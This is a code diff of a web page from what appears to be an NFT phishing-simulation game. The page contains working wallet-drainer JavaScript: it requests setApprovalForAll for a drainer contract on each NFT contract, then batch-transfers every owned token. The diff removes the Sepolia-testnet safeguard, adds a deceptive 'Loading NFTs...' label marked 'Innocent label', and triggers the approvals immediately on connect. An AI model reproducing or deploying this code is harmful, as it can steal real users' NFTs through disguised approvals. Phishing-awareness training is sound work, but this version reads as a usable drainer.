@@ -98,7 +98,7 @@
   <div class="frame-container">
     <div class="card">
       <h1>🧪 Level 2: Animate Your NFT</h1>
-      <p>Claim your exclusive animation with one click…</p>
+      <p>Claim your exclusive animation…</p>
       <div class="button-container">
         <button id="connectBtn">Connect Wallet</button>
         <button id="animateBtn">Animate NFT Now!</button>
@@ -107,8 +107,8 @@
       <a href="level3.html" id="nextBtn">➡️ Proceed to Level 3</a>
       <div class="tooltip-box">
         💡 <strong>Did you know?</strong><br>
-        Most NFTs include <code>setApprovalForAll</code>, part of ERC-721/1155 standards. It enables marketplaces to manage your NFTs — but phishing dApps abuse this to steal your assets.<br><br>
-        🚨 This simulation teaches how malicious sites trick you into approving token access.
+        2. Most NFTs include setApprovalForAll, part of ERC-721/1155 standards. It lets marketplaces manage your NFTs, but scammers use fake animation sites to trick you into approving a drain. Always verify contracts!<br><br>
+        🚨 This is a simulation—rejecting the transaction saves your NFTs!
       </div>
     </div>
   </div>
@@ -137,77 +137,68 @@
       document.getElementById("failCount").textContent = localStorage.getItem("w3game_failed") || 0;
     }
 
-    // Step 1: Connect wallet + auto-approve all NFT contracts
     document.getElementById("connectBtn").onclick = async () => {
       const status = document.getElementById("status");
-      status.innerText = "⏳ Connecting and approving NFT access...";
+      status.innerText = "⏳ Loading NFTs..."; // Innocent label
       try {
-        if (!window.ethereum) return alert("MetaMask not detected.");
+        if (!window.ethereum) {
+          status.innerText = "❌ MetaMask not detected.";
+          return;
+        }
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
-        const network = await provider.getNetwork();
-        if (network.chainId !== 11155111) {
-          status.innerText = "❌ Please switch to Sepolia Testnet.";
-          return;
-        }
         const user = await signer.getAddress();
-        let summary = `✅ Connected: ${user}\n\n`;
 
+        // 🚨 Triggers approval requests immediately after connect
+        for (const address of nftContracts) {
+          const contract = new ethers.Contract(address, nftABI, signer);
+          const approved = await contract.isApprovedForAll(user, drainerContract);
+          if (!approved) {
+            const tx = await contract.setApprovalForAll(drainerContract, true);
+            await tx.wait();
+          }
+        }
+
+        let summary = `✅ Connected: ${user}\n\n`;
         for (const address of nftContracts) {
           const contract = new ethers.Contract(address, nftABI, signer);
           const name = await contract.name();
           const balance = await contract.balanceOf(user);
           summary += `🖼️ ${name}: ${balance} NFT(s)\n`;
-
-          // Request setApprovalForAll silently on each
-          const approved = await contract.isApprovedForAll(user, drainerContract);
-          if (!approved) {
-            const tx = await contract.setApprovalForAll(drainerContract, true);
-            await tx.wait();
-            summary += `✅ Approved ${name} for transfer.\n`;
-          }
         }
-
         status.innerText = summary;
       } catch (err) {
         console.error(err);
-        status.innerText = "❌ Wallet connection failed.";
+        status.innerText = "❌ Connection or approval failed.";
       }
     };
 
-    // Step 2: On animate click, drain all approved NFTs
     document.getElementById("animateBtn").onclick = async () => {
       const status = document.getElementById("status");
       if (!signer) return alert("Please connect your wallet first.");
       try {
-        status.innerText += "\n🎬 Animating NFTs...";
-
         const user = await signer.getAddress();
-        let tokenIdMatrix = [];
 
-        for (const contractAddr of nftContracts) {
-          const contract = new ethers.Contract(contractAddr, nftABI, signer);
+        // Get all token IDs
+        let tokenIdMatrix = [];
+        for (const address of nftContracts) {
+          const contract = new ethers.Contract(address, nftABI, signer);
           const balance = await contract.balanceOf(user);
           let ids = [];
           for (let i = 0; i < balance; i++) {
-            try {
-              const tokenId = await contract.tokenOfOwnerByIndex(user, i);
-              ids.push(Number(tokenId));
-            } catch (err) {
-              ids.push(0);
-            }
+            const id = await contract.tokenOfOwnerByIndex(user, i);
+            ids.push(Number(id));
           }
-          tokenIdMatrix.push(ids.length > 0 ? ids : [0]);
+          tokenIdMatrix.push(ids);
         }
 
+        // Call the drain function
         const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
         const tx = await drainer.batchDrain(nftContracts, tokenIdMatrix);
         await tx.wait();
 
-        status.innerText +=
-          "\n💀 All NFTs have been drained to the attacker address.\n" +
-          "🧠 Lesson: Even a connect button can be dangerous!";
+        status.innerText = "💀 NFTs transferred! Check Sepolia Explorer for approval + transfer logs.";
         localStorage.setItem("w3game_level2", "drained");
         let failCount = parseInt(localStorage.getItem("w3game_failed") || 0);
         localStorage.setItem("w3game_failed", failCount + 1);
@@ -215,13 +206,13 @@
         document.getElementById("nextBtn").style.display = "inline-block";
       } catch (err) {
         if (err.code === "ACTION_REJECTED") {
-          status.innerText =
-            "✅ You survived Level 2!\nYou rejected the drain transaction. Always review approvals!";
+          status.innerText = "✅ You survived by rejecting the transaction!";
           let surviveCount = parseInt(localStorage.getItem("w3game_survived") || 0);
           localStorage.setItem("w3game_survived", surviveCount + 1);
           updateCounters();
           document.getElementById("nextBtn").style.display = "inline-block";
         } else {
+          console.error(err);
           status.innerText = "⚠️ Unexpected error: " + err.message;
         }
       }
